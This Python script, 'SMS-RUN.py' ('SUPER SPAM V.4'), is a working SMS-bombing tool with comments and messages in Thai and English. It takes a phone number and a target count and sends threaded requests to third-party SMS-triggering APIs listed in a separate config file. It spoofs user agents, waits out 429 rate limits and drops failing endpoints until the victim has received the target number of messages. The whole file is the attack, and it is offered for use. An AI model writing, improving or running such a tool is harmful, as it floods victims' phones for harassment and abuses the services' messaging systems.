# program/SMS-RUN.py
import requests
import threading
import time
import sys
import random
from fake_useragent import UserAgent
from API_LIST import API_CONFIG

ua = UserAgent()

# ==========================================
#  COLOR & STYLE SYSTEM
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_WHITE = Fore.WHITE + Style.DIM
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_WHITE = C_RESET = ""

# ==========================================
# ตั้งค่าความแรง & ปรับสมดุล Cooldown
# ==========================================
MAX_THREADS = 10   
TIMEOUT_SEC = 8
MAX_RETRIES = 3
COOLDOWN_TIME_429 = 30  # พัก 30 วินาทีเมื่อติด 429

lock = threading.Lock()
success_total = 0

api_fail_counts = {k: 0 for k in API_CONFIG.keys()}
api_cooldowns = {k: 0.0 for k in API_CONFIG.keys()}
banned_apis = set()

def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    if api_key in banned_apis: return

    with lock:
        if time.time() < api_cooldowns.get(api_key, 0):
            return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        is_success = False
        should_ban = False
        
        if cfg.get("success_check"):
            if cfg["success_check"](response.text):
                is_success = True
        else:
            if response.status_code in (200, 201) and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                api_fail_counts[api_key] = 0
                api_cooldowns[api_key] = time.time() + 5
                print(f"{C_GREEN} ส่งสำเร็จ ({success_total}) | API: {cfg['name']}{C_RESET}")
        
        else:
            status = response.status_code
            if status == 429: 
                with lock:
                    api_cooldowns[api_key] = time.time() + COOLDOWN_TIME_429
                print(f"{C_YELLOW} API {cfg['name']} ติดคูลดาวน์ {COOLDOWN_TIME_429}s (Status 429){C_RESET}")
                return 
            
            if status in (403, 401): 
                should_ban = True
            else:
                with lock:
                    api_fail_counts[api_key] += 1
                    if api_fail_counts[api_key] >= MAX_RETRIES:
                        should_ban = True

            if should_ban:
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED} API {cfg['name']} UNSUCCESSFUL (Status {status}) -> deleted!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        with lock:
            api_fail_counts[api_key] += 1
            if api_fail_counts[api_key] >= MAX_RETRIES:
                if api_key not in banned_apis:
                    print(f"{C_RED} API {cfg['name']} UNSUCCESSFUL -> deleted !{C_RESET}")
                    banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    print(f"\n{C_CYAN} SUPER SPAM V.4 (Smart Logic) : {phone}{C_RESET}")
    print(f"{C_CYAN} : SUCCESS TARGET: {target_amount} ATTEMPTS{C_RESET}")
    print(f"{C_WHITE} SYSTEM WILL DELETE API AFTER {MAX_RETRIES} FAILED ATTEMPTS{C_RESET}")
    print(f"{C_WHITE} AUTO-COOLDOWN ON 429: {COOLDOWN_TIME_429} SECONDS{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        now = time.time()
        active_apis = [k for k in all_api_keys if k not in banned_apis and now >= api_cooldowns.get(k, 0)]
        
        if not active_apis:
            unbanned = [k for k in all_api_keys if k not in banned_apis]
            if not unbanned:
                print(f"\n{C_RED}❌ ไม่มี API ที่ใช้งานได้เหลืออยู่เลย! (โดนแบนหมด){C_RESET}")
                break
            time.sleep(1)
            continue

        api_key = active_apis[attempt_count % len(active_apis)]
        
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.05)
            threads = [t for t in threads if t.is_alive()]
        
        time.sleep(0.2)

    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}SUCCESS!{C_RESET}")
    print(f"SUCCESS: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f"ATTEMPTS: {attempt_count} TIMES")
    print(f" BANNED API : {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        phone_input = input(f"{C_YELLOW}PHONE NUMBER: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED}UNSUCCESSFUL (Invalid Phone Number){C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW}TARGET SUCCESS COUNT: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED}UNSUCCESSFUL (Invalid Target Count){C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}UNSUCCESSFUL (Interrupted by user){C_RESET}")
